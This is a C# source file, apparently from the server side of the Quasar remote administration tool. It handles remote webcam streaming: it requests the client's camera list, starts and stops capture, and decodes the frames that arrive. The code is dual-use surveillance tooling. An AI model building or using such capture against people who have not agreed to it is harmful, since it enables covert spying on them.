using Quasar.Common.Messages;
using Quasar.Common.Networking;
using Quasar.Server.Networking;
using System;
using System.Drawing;
using System.IO;

namespace Quasar.Server.Messages
{
    /// <summary>
    /// Handles messages for the interaction with the remote webcam.
    /// </summary>
    public class RemoteWebcamHandler : MessageProcessorBase<Bitmap>, IDisposable
    {
        /// <summary>
        /// States if the client is currently streaming webcam frames.
        /// </summary>
        public bool IsStarted { get; set; }

        /// <summary>
        /// Indicates whether at least one valid frame has been received.
        /// </summary>
        public bool HasReceivedFrame { get; private set; }

        /// <summary>
        /// Used in lock statements to synchronize access between UI thread and thread pool.
        /// </summary>
        private readonly object _syncLock = new object();

        /// <summary>
        /// Tracks how many consecutive empty (null) frames have been received.
        /// Used to detect cameras that fail to produce any output.
        /// </summary>
        private int _consecutiveEmptyFrames;

        /// <summary>
        /// Represents the method that will handle webcam device changes.
        /// </summary>
        /// <param name="sender">The message processor which raised the event.</param>
        /// <param name="webcamNames">All currently available webcam devices.</param>
        public delegate void WebcamsChangedEventHandler(object sender, string[] webcamNames);

        /// <summary>
        /// Represents the method that will handle webcam status updates.
        /// </summary>
        /// <param name="sender">The message processor which raised the event.</param>
        /// <param name="statusText">The status text to display.</param>
        public delegate void StatusChangedEventHandler(object sender, string statusText);

        /// <summary>
        /// Raised when the list of webcam devices has been received.
        /// </summary>
        /// <remarks>
        /// Handlers registered with this event will be invoked on the 
        /// <see cref="System.Threading.SynchronizationContext"/> chosen when the instance was constructed.
        /// </remarks>
        public event WebcamsChangedEventHandler WebcamsChanged;

        /// <summary>
        /// Raised when the streaming status changes (e.g., waiting for camera, error).
        /// </summary>
        public event StatusChangedEventHandler StatusChanged;

        /// <summary>
        /// Reports changed webcam devices.
        /// </summary>
        /// <param name="webcamNames">All currently available webcam devices.</param>
        private void OnWebcamsChanged(string[] webcamNames)
        {
            SynchronizationContext.Post(val =>
            {
                var handler = WebcamsChanged;
                handler?.Invoke(this, (string[])val);
            }, webcamNames);
        }

        /// <summary>
        /// Reports a status update.
        /// </summary>
        /// <param name="statusText">The status text to display.</param>
        private void OnStatusChanged(string statusText)
        {
            SynchronizationContext.Post(val =>
            {
                var handler = StatusChanged;
                handler?.Invoke(this, (string)val);
            }, statusText);
        }

        /// <summary>
        /// The client which is associated with this remote webcam handler.
        /// </summary>
        private readonly Client _client;

        /// <summary>
        /// Initializes a new instance of the <see cref="RemoteWebcamHandler"/> class using the given client.
        /// </summary>
        /// <param name="client">The associated client.</param>
        public RemoteWebcamHandler(Client client) : base(true)
        {
            _client = client;
        }

        /// <inheritdoc />
        public override bool CanExecute(IMessage message) => message is GetWebcamsResponse ||
                                                              message is GetWebcamFrameResponse;

        /// <inheritdoc />
        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        /// <inheritdoc />
        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetWebcamsResponse w:
                    Execute(sender, w);
                    break;
                case GetWebcamFrameResponse f:
                    Execute(sender, f);
                    break;
            }
        }

        /// <summary>
        /// Begins receiving webcam frames from the client using the specified device and quality.
        /// </summary>
        /// <param name="deviceIndex">The webcam device index.</param>
        /// <param name="quality">The JPEG quality (1-100).</param>
        public void BeginReceiveFrames(int deviceIndex, int quality)
        {
            lock (_syncLock)
            {
                IsStarted = true;
                HasReceivedFrame = false;
                _consecutiveEmptyFrames = 0;
                _client.Send(new GetWebcamFrame
                {
                    CreateNew = true,
                    DeviceIndex = deviceIndex,
                    Quality = quality
                });
            }
        }

        /// <summary>
        /// Ends receiving webcam frames from the client.
        /// </summary>
        public void EndReceiveFrames()
        {
            lock (_syncLock)
            {
                IsStarted = false;
                _client.Send(new DoWebcamStop());
            }
        }

        /// <summary>
        /// Refreshes the available webcam devices of the client.
        /// </summary>
        public void RefreshWebcams()
        {
            _client.Send(new GetWebcams());
        }

        private void Execute(ISender client, GetWebcamsResponse message)
        {
            OnWebcamsChanged(message.WebcamNames ?? new string[0]);
        }

        private void Execute(ISender client, GetWebcamFrameResponse message)
        {
            lock (_syncLock)
            {
                if (!IsStarted)
                    return;

                if (message.Image != null && message.Image.Length > 0)
                {
                    _consecutiveEmptyFrames = 0;

                    if (!HasReceivedFrame)
                    {
                        HasReceivedFrame = true;
                        OnStatusChanged("Streaming...");
                    }

                    try
                    {
                        using (var ms = new MemoryStream(message.Image))
                        {
                            var bmp = new Bitmap(ms);
                            OnReport(bmp);
                        }
                    }
                    catch (Exception)
                    {
                        // Invalid image data - skip frame
                    }
                }
                else
                {
                    _consecutiveEmptyFrames++;

                    // Provide status feedback while waiting for camera to start
                    if (!HasReceivedFrame && _consecutiveEmptyFrames <= 40)
                    {
                        OnStatusChanged("Waiting for camera to initialize...");
                    }
                    else if (!HasReceivedFrame && _consecutiveEmptyFrames > 40)
                    {
                        OnStatusChanged("Camera not responding — try Stop and Start again, or check if another app is using the camera");
                    }
                }

                message.Image = null;

                // Request next frame (continuous streaming like Remote Desktop)
                client.Send(new GetWebcamFrame
                {
                    Quality = message.Quality,
                    DeviceIndex = message.DeviceIndex
                });
            }
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                lock (_syncLock)
                {
                    IsStarted = false;
                }
            }
        }
    }
}
